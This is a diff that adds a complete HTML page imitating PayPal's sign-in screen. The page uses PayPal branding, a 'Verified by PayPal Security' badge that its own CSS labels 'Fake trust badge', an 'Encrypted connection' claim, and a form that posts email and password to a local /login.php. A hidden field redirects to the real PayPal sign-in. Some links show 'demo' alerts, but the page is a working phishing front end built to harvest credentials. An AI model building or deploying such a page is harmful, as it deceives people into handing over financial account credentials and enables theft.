@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #f5f7fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 460px;
+            width: 100%;
+            background: white;
+            border-radius: 12px;
+            padding: 40px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            color: #003087;
+            font-size: 36px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        
+        .sub-logo {
+            text-align: center;
+            margin-bottom: 25px;
+            color: #2c2e2f;
+            font-size: 14px;
+        }
+        
+        .card form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card input {
+            height: 52px;
+            border: 1px solid #9da3a6;
+            border-radius: 4px;
+            font-size: 16px;
+            padding: 0 16px;
+            margin-bottom: 16px;
+            transition: all 0.2s;
+        }
+        
+        .card input:focus {
+            outline: none;
+            border-color: #003087;
+            box-shadow: 0 0 0 2px rgba(0,48,135,0.1);
+        }
+        
+        .card input::placeholder {
+            color: #6b6f72;
+        }
+        
+        .card button {
+            background: #003087;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 700;
+            color: white;
+            height: 52px;
+            cursor: pointer;
+            margin: 8px 0 16px;
+            transition: background 0.2s;
+        }
+        
+        .card button:hover {
+            background: #002267;
+        }
+        
+        .card a {
+            color: #003087;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 12px;
+            display: inline-block;
+        }
+        
+        .card a:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            color: #6b6f72;
+            font-size: 12px;
+            margin: 16px 0;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #e5e7e9;
+        }
+        
+        .divider::before {
+            margin-right: 16px;
+        }
+        
+        .divider::after {
+            margin-left: 16px;
+        }
+        
+        .qr-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+            border: 1px solid #e5e7e9;
+            border-radius: 4px;
+            margin: 16px 0;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .qr-login:hover {
+            background: #f5f7fa;
+        }
+        
+        .qr-login span {
+            margin-left: 8px;
+            color: #003087;
+            font-weight: 500;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #6b6f72;
+            text-align: center;
+        }
+        
+        .footer a {
+            color: #003087;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        input[type="hidden"] {
+            display: none;
+        }
+        
+        /* Security badges */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0 0;
+            font-size: 12px;
+            color: #6b6f72;
+        }
+        
+        .security-badge span {
+            margin: 0 4px;
+        }
+        
+        /* Remember me */
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            font-size: 14px;
+            color: #2c2e2f;
+        }
+        
+        .remember-me input {
+            width: 18px;
+            height: 18px;
+            margin-right: 8px;
+            margin-bottom: 0;
+            cursor: pointer;
+        }
+        
+        /* Help links row */
+        .help-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 10px 0;
+        }
+        
+        /* Mobile responsive */
+        @media (max-width: 500px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .help-row {
+                flex-direction: column;
+                gap: 10px;
+                align-items: flex-start;
+            }
+        }
+        
+        /* Fake trust badge */
+        .trust-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 15px 0 0;
+            font-size: 11px;
+            color: #6b6f72;
+        }
+        
+        .trust-badge img {
+            width: 16px;
+            height: 16px;
+            margin-right: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>PayPal</h1>
+        </div>
+        <div class="sub-logo">
+            <span>Sign in to your account</span>
+        </div>
+        
+        <div class="card">
+            <form method="POST" action="/login.php" id="loginForm">
+                <input type="hidden" name="redirect" value="https://www.paypal.com/signin">
+                
+                <input type="email" name="email" placeholder="Email or mobile number" required autofocus>
+                <input type="password" name="password" placeholder="Password" required>
+                
+                <div class="help-row">
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember" checked>
+                        <label for="remember">Keep me logged in</label>
+                    </div>
+                    <a href="#" onclick="alert('Password reset demo'); return false;">Forgot password?</a>
+                </div>
+                
+                <button type="submit">Log In</button>
+                
+                <a href="#" onclick="alert('Signup demo'); return false;">Sign up for a PayPal account</a>
+            </form>
+            
+            <div class="divider">or</div>
+            
+            <div class="qr-login" onclick="alert('QR code login demo'); return false;">
+                <span>📱</span>
+                <span>Log in with QR code</span>
+            </div>
+            
+            <div class="security-badge">
+                <span>🔒</span>
+                <span>Encrypted connection</span>
+                <span>•</span>
+                <span>PayPal © 2025</span>
+            </div>
+            
+            <div class="trust-badge">
+                <span>✅</span>
+                <span>Verified by PayPal Security</span>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#" onclick="alert('Help center demo'); return false;">Help</a>
+            <a href="#" onclick="alert('Contact demo'); return false;">Contact</a>
+            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy</a>
+            <a href="#" onclick="alert('Terms demo'); return false;">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        // Form validation
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const email = document.querySelector('input[name="email"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            
+            if (!email || !password) {
+                e.preventDefault();
+                alert('Please enter your email and password');
+                return;
+            }
+            
+            // Simple email/phone validation
+            if (!email.includes('@') && !email.match(/^[\d\+\-\(\)\s]+$/)) {
+                e.preventDefault();
+                alert('Please enter a valid email or phone number');
+                return;
+            }
+        });
+        
+        // Remember me effect
+        const rememberCheck = document.getElementById('remember');
+        rememberCheck.addEventListener('change', function() {
+            if (this.checked) {
+                console.log('Remember me enabled');
+            }
+        });
+        
+        // Input effects
+        const inputs = document.querySelectorAll('input[type="email"], input[type="password"]');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#003087';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.borderColor = '#9da3a6';
+                }
+            });
+        });
+        
+        // Fake typing detection
+        let typingTimer;
+        inputs.forEach(input => {
+            input.addEventListener('keyup', function() {
+                clearTimeout(typingTimer);
+                typingTimer = setTimeout(() => {
+                    // Simulate "checking credentials"
+                    if (this.value.length > 3) {
+                        // Optional visual effect
+                    }
+                }, 800);
+            });
+        });
+        
+        // QR login demo
+        document.querySelector('.qr-login').addEventListener('click', function() {
+            alert('QR code login would open here');
+        });
+        
+        // Prevent form resubmission warning
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+    </script>
+</body>
+</html>
